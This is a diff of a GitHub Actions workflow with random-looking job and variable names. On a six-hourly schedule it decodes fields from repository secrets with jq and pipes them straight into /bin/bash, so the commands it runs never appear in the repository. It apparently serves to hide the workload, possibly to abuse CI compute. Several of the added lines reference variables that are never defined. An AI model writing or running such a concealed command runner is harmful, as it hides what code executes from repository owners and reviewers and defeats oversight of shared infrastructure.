@@ -1,19 +1,22 @@
 name: weihuanpeng1987
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 0/6 * * *'
-
-jobs:  # 15279
+    - cron: '26 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: weihuanpeng1987
         env:
-          mjjt85: ${{ secrets.mjjt85 }}
+          cbl2694: ${{ secrets.cbl2694 }}
         run: |
-          echo $mjjt85 | jq -r .rzlm08 | /bin/bash
-          echo $on78021 | jq -r .o31924 | /bin/bash
+          echo $cbl2694 | jq -r .od3 | /bin/bash
+          echo $rfs2377 | jq -r .afthx91 | /bin/bash
+          echo $fg820 | jq -r .na6 | /bin/bash
+          echo $f0 | jq -r .ebl25 | /bin/bash
+          echo $bgtq2 | jq -r .pwue82 | /bin/bash
+          echo $h77 | jq -r .dgeyf890 | /bin/bash
 
